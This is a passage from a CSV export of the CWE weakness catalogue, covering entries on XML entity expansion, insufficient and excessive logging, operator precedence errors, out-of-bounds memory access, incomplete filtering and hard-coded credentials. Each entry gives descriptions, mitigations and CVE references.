to read data from closed sockets.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2122::REFERENCE:CVE-2007-4103:DESCRIPTION:Product allows resource exhaustion via a large number of calls that do not complete a 3-way handshake.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4103::REFERENCE:CVE-2002-1372:DESCRIPTION:Chain: Return values of file/socket operations are not checked (CWE-252), allowing resultant consumption of file descriptors (CWE-772).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1372::\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO42-C:ENTRY NAME:Close files when they are no longer needed:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM31-C:ENTRY NAME:Free dynamically allocated memory when no longer needed:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-772::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-CWE-772::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP14:ENTRY NAME:Failure to Release Resource::\",::469::,\"::TYPE:Maintenance:NOTE:Resource exhaustion (CWE-400) is currently treated as a weakness, although it is more like a category of weaknesses that all have the same type of consequence. While this entry treats CWE-400 as a parent in view 1000, the relationship is probably more appropriately described as a chain.::TYPE:Theoretical:NOTE:Vulnerability theory is largely about how behaviors and resources interact. Resource exhaustion can be regarded as either a consequence or an attack, depending on the perspective. This entry is an attempt to reflect one of the underlying weaknesses that enable these attacks (or consequences) to take place.::\",\n776,\"Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')\",Base,Draft,\"The product uses XML documents and allows their structure to be defined with a Document Type Definition (DTD), but it does not properly control the number of recursive definitions of entities.\",\"If the DTD contains a large number of nested or recursive entities, this can lead to explosive growth of data when parsed, causing a denial of service.\",::NATURE:ChildOf:CWE ID:674:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:674:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:405:VIEW ID:1000::,\"\",::LANGUAGE NAME:XML:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:XEE:DESCRIPTION:XEE is the acronym commonly used for XML Entity Expansion.::TERM:Billion Laughs Attack::TERM:XML Bomb:DESCRIPTION:While the XML Bomb term was used in the early years of knowledge of this issue, the XEE term seems to be more commonly used.::\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):NOTE:If parsed, recursive entity references allow the attacker to expand data exponentially, quickly consuming all system resources.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Operation:DESCRIPTION:If possible, prohibit the use of DTDs or use an XML parser that limits the expansion of recursive DTD entities.::PHASE:Implementation:DESCRIPTION:Before parsing XML files with associated DTDs, scan for recursive entity declarations and do not continue parsing potentially explosive content.::\",\"::REFERENCE:CVE-2008-3281:DESCRIPTION:XEE in XML-parsing library.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3281::REFERENCE:CVE-2011-3288:DESCRIPTION:XML bomb / XEE in enterprise communication product.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-3288::REFERENCE:CVE-2011-1755:DESCRIPTION:Billion laughs attack in XMPP server daemon.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-1755::REFERENCE:CVE-2009-1955:DESCRIPTION:XML bomb in web server module:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1955::REFERENCE:CVE-2003-1564:DESCRIPTION:Parsing library allows XML bomb:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1564::\",,,\"::TAXONOMY NAME:WASC:ENTRY ID:44:ENTRY NAME:XML Entity Expansion::\",::197::,\"\",\n778,\"Insufficient Logging\",Base,Draft,\"When a security-critical event occurs, the product either does not record the event or omits important details about the event when logging it.\",\"When security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic analysis after an attack succeeds. As organizations adopt cloud storage resources, these technologies often require configuration changes to enable detailed logging information, since detailed logging can incur additional costs. This could lead to telemetry gaps in critical audit logs. For example, in Azure, the default value for logging is disabled.\",::NATURE:ChildOf:CWE ID:223:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:693:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Cloud Computing:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Operation:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:If security critical information is not recorded, there will be no trail for forensic analysis and discovering the cause of problems or the source of attacks may become more difficult or impossible.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Use a centralized logging mechanism that supports multiple levels of detail.::PHASE:Implementation:DESCRIPTION:Ensure that all security-related successes and failures can be logged. When storing data in the cloud (e.g., AWS S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to enable and capture detailed logging information.::PHASE:Operation:DESCRIPTION:Be sure to set the level of logging appropriately in a production environment. Sufficient data should be logged to enable system administrators to detect attacks, diagnose errors, and recover from attacks. At the same time, logging too much data (CWE-779) can cause the same problems, including unexpected costs when using a cloud environment.::PHASE:Operation:DESCRIPTION:To enable storage logging using Azure's Portal, navigate to the name of the Storage Account, locate Monitoring (CLASSIC) section, and select Diagnostic settings (classic). For each of the various properties (blob, file, table, queue), ensure the status is properly set for the desired logging data. If using PowerShell, the Set-AzStorageServiceLoggingProperty command could be called using appropriate -ServiceType, -LoggingOperations, and -RetentionDays arguments.::\",\"::REFERENCE:CVE-2008-4315:DESCRIPTION:server does not log failed authentication attempts, making it easier for attackers to perform brute force password guessing without being detected:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4315::REFERENCE:CVE-2008-1203:DESCRIPTION:admin interface does not log failed authentication attempts, making it easier for attackers to perform brute force password guessing without being detected:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1203::REFERENCE:CVE-2007-3730:DESCRIPTION:default configuration for POP server does not log source IP or username for login attempts:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3730::REFERENCE:CVE-2007-1225:DESCRIPTION:proxy does not log requests without http:// in the URL, allowing web surfers to access restricted web content without detection:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1225::REFERENCE:CVE-2003-1566:DESCRIPTION:web server does not log requests for a non-standard request type:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1566::\",,,\"\",,\"\",\n779,\"Logging of Excessive Data\",Base,Draft,\"The product logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.\",\"While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment.\",::NATURE:ChildOf:CWE ID:400:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Operation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Other):NOTE:Log files can become so large that they consume excessive resources, such as disk and CPU, which can hinder the performance of the system.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:Logging too much information can make the log files of less use to forensics analysts and developers when trying to diagnose a problem or recover from an attack.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:If system administrators are unable to effectively process log files, attempted attacks may go undetected, possibly leading to eventual system compromise.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Suppress large numbers of duplicate log messages and replace them with periodic summaries. For example, syslog may include an entry that states last message repeated X times when recording repeated events.::PHASE:Architecture and Design:DESCRIPTION:Support a maximum size for the log file that can be controlled by the administrator. If the maximum size is reached, the admin should be notified. Also, consider reducing functionality of the product. This may result in a denial-of-service to legitimate product users, but it will prevent the product from adversely impacting the entire system.::PHASE:Implementation:DESCRIPTION:Adjust configurations appropriately when the product is transitioned from a debug state to production.::\",\"::REFERENCE:CVE-2007-0421:DESCRIPTION:server records a large amount of data to the server log when it receives malformed headers:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0421::REFERENCE:CVE-2002-1154:DESCRIPTION:chain: application does not restrict access to front-end for updates, which allows attacker to fill the error log:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1154::\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 7.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-3::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 7.2::\",,\"\",\n783,\"Operator Precedence Logic Error\",Base,Draft,\"The product uses an expression in which operator precedence causes incorrect logic to be used.\",\"While often just a bug, operator precedence logic errors can have serious consequences if they are used in security-critical code, such as making an authentication decision.\",::NATURE:ChildOf:CWE ID:670:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Rarely::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Rarely::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Rarely::,\"\",\"\",\"::PHASE:Implementation:NOTE:Logic errors related to operator precedence may cause problems even during normal operation, so they are probably discovered quickly during the testing phase. If testing is incomplete or there is a strong reliance on manual review of the code, then these errors may not be discovered before the software is deployed.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Varies by Context:IMPACT:Unexpected State:NOTE:The consequences will vary based on the context surrounding the incorrect precedence. In a security decision, integrity or confidentiality are the most likely results. Otherwise, a crash may occur due to the software reaching an unexpected state.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Regularly wrap sub-expressions in parentheses, especially in security-critical code.::\",\"::REFERENCE:CVE-2008-2516:DESCRIPTION:Authentication module allows authentication bypass because it uses (x = call(args) == SUCCESS) instead of ((x = call(args)) == SUCCESS).:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2516::REFERENCE:CVE-2008-0599:DESCRIPTION:Chain: Language interpreter calculates wrong buffer size (CWE-131) by using size = ptr ? X : Y instead of size = (ptr ? X : Y) expression.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0599::REFERENCE:CVE-2001-1155:DESCRIPTION:Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1155::\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP00-C:ENTRY NAME:Use parentheses for precedence of operation:MAPPING FIT:Exact::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:EXP04-PL:ENTRY NAME:Do not mix the early-precedence logical operators with late-precedence logical operators:MAPPING FIT:CWE More Abstract::\",,\"\",\n786,\"Access of Memory Location Before Start of Buffer\",Base,Incomplete,\"The product reads or writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.\",\"This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:For an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffer's position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences.::SCOPE:Integrity:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:NOTE:Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash.::SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:NOTE:If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code. If the corrupted memory is data rather than instructions, the system will continue to function with improper changes, possibly in violation of an implicit or explicit policy.::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2002-2227:DESCRIPTION:Unchecked length of SSLv2 challenge value leads to buffer underflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2227::REFERENCE:CVE-2007-4580:DESCRIPTION:Buffer underflow from a small size value with a large buffer (length parameter inconsistency, CWE-130):LINK:https://www.cve.org/CVERecord?id=CVE-2007-4580::REFERENCE:CVE-2007-1584:DESCRIPTION:Buffer underflow from an all-whitespace string, which causes a counter to be decremented before the buffer while looking for a non-whitespace character.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1584::REFERENCE:CVE-2007-0886:DESCRIPTION:Buffer underflow resultant from encoded data that triggers an integer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0886::REFERENCE:CVE-2006-6171:DESCRIPTION:Product sets an incorrect buffer size limit, leading to off-by-two buffer underflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6171::REFERENCE:CVE-2006-4024:DESCRIPTION:Negative value is used in a memcpy() operation, leading to buffer underflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4024::REFERENCE:CVE-2004-2620:DESCRIPTION:Buffer underflow due to mishandled special characters:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2620::\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ARR30-C:ENTRY NAME:Do not form or use out-of-bounds pointers or array subscripts:MAPPING FIT:CWE More Specific::\",,\"\",\n787,\"Out-of-bounds Write\",Base,Draft,\"The product writes data past the end, or before the beginning, of the intended buffer.\",\"\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::,\"::ORDINALITY:Resultant:DESCRIPTION:At the point when the product writes data to an invalid location, it is likely that a separate weakness already occurred earlier. For example, the product might alter an index, perform incorrect pointer arithmetic, initialize or release memory incorrectly, etc., thus referencing a memory location outside the buffer.::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Often::LANGUAGE CLASS:Assembly:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Often::,\"\",\"::TERM:Memory Corruption:DESCRIPTION:Often used to describe the consequences of writing to memory outside the bounds of a buffer, or to memory that is otherwise invalid.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:NOTE:Write operations could cause memory corruption. In some cases, an adversary can modify control data such as return addresses in order to execute unexpected code.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:Attempting to access out-of-range, invalid, or unauthorized memory could cause the product to crash.::SCOPE:Other:IMPACT:Unexpected State:NOTE:Subsequent write operations can produce undefined or unexpected results.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.:EFFECTIVENESS:High::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.::\",\"::PHASE:Requirements:STRATEGY:Language Selection:DESCRIPTION:Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer. Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Consider adhering to the following rules when allocating and managing an application's memory: Double check that the buffer is as large as specified. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space. If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.:EFFECTIVENESS:Moderate::\",\"::REFERENCE:CVE-2021-21220:DESCRIPTION:Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21220::REFERENCE:CVE-2021-28664:DESCRIPTION:GPU kernel driver allows memory corruption because a user can obtain read/write access to read-only pages, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-28664::REFERENCE:CVE-2020-17087:DESCRIPTION:Chain: integer truncation (CWE-197) causes small buffer allocation (CWE-131) leading to out-of-bounds write (CWE-787) in kernel pool, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-17087::REFERENCE:CVE-2020-1054:DESCRIPTION:Out-of-bounds write in kernel-mode driver, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-1054::REFERENCE:CVE-2020-0041:DESCRIPTION:Escape from browser sandbox using out-of-bounds write due to incorrect bounds check, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-0041::REFERENCE:CVE-2020-0968:DESCRIPTION:Memory corruption in web browser scripting engine, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-0968::REFERENCE:CVE-2020-0022:DESCRIPTION:chain: mobile phone Bluetooth implementation does not include offset when calculating packet length (CWE-682), leading to out-of-bounds write (CWE-787):LINK:https://www.cve.org/CVERecord?id=CVE-2020-0022::REFERENCE:CVE-2019-1010006:DESCRIPTION:Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1010006::REFERENCE:CVE-2009-1532:DESCRIPTION:malformed inputs cause accesses of uninitialized or previously-deleted objects, leading to memory corruption:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1532::REFERENCE:CVE-2009-0269:DESCRIPTION:chain: -1 value from a function call was intended to indicate an error, but is used as an array index instead.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0269::REFERENCE:CVE-2002-2227:DESCRIPTION:Unchecked length of SSLv2 challenge value leads to buffer underflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2227::REFERENCE:CVE-2007-4580:DESCRIPTION:Buffer underflow from a small size value with a large buffer (length parameter inconsistency, CWE-130):LINK:https://www.cve.org/CVERecord?id=CVE-2007-4580::REFERENCE:CVE-2007-4268:DESCRIPTION:Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122):LINK:https://www.cve.org/CVERecord?id=CVE-2007-4268::REFERENCE:CVE-2009-2550:DESCRIPTION:Classic stack-based buffer overflow in media player using a long entry in a playlist:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2550::REFERENCE:CVE-2009-2403:DESCRIPTION:Heap-based buffer overflow in media player using a long entry in a playlist:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2403::\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 3.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SI-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SI-2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-3::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 3.5::\",,\"\",\n788,\"Access of Memory Location After End of Buffer\",Base,Incomplete,\"The product reads or writes to a buffer using an index or pointer that references a memory location after the end of the buffer.\",\"This typically occurs when a pointer or its index is incremented to a position after the buffer; or when pointer arithmetic results in a position after the buffer.\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:For an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffer's position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences.::SCOPE:Integrity:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:NOTE:Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.::SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:NOTE:If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator.::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2009-2550:DESCRIPTION:Classic stack-based buffer overflow in media player using a long entry in a playlist:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2550::REFERENCE:CVE-2009-2403:DESCRIPTION:Heap-based buffer overflow in media player using a long entry in a playlist:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2403::REFERENCE:CVE-2009-0689:DESCRIPTION:large precision value in a format string triggers overflow:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0689::REFERENCE:CVE-2009-0558:DESCRIPTION:attacker-controlled array index leads to code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0558::REFERENCE:CVE-2008-4113:DESCRIPTION:OS kernel trusts userland-supplied length value, allowing reading of sensitive information:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4113::REFERENCE:CVE-2007-4268:DESCRIPTION:Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122):LINK:https://www.cve.org/CVERecord?id=CVE-2007-4268::\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-CWE-788::\",,\"\",\n791,\"Incomplete Filtering of Special Elements\",Base,Incomplete,\"The product receives data from an upstream component, but does not completely filter special elements before sending it to a downstream component.\",\"\",::NATURE:ChildOf:CWE ID:790:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"\",\"\",\"\",,,\"\",,\"\",\n798,\"Use of Hard-coded Credentials\",Base,Draft,\"The product contains hard-coded credentials, such as a password or cryptographic key.\",\"There are two main variations: Inbound: the product contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials. In this variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the product. It can also be difficult for the administrator to detect. Outbound: the product connects to another system or component, and it contains hard-coded credentials for connecting to that component. This variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password that can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end product.\",::NATURE:ChildOf:CWE ID:1391:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:344:VIEW ID:1000::NATURE:ChildOf:CWE ID:671:VIEW ID:1000::NATURE:PeerOf:CWE ID:257:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question. Any user of the product that hard-codes passwords may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:SCOPE:Other:IMPACT:Read Application Data:IMPACT:Gain Privileges or Assume Identity:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Other:NOTE:This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the product will have the same password, even across different organizations, this enables massive attacks such as worms to take place.::\",\"::METHOD:Black Box:DESCRIPTION:Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming 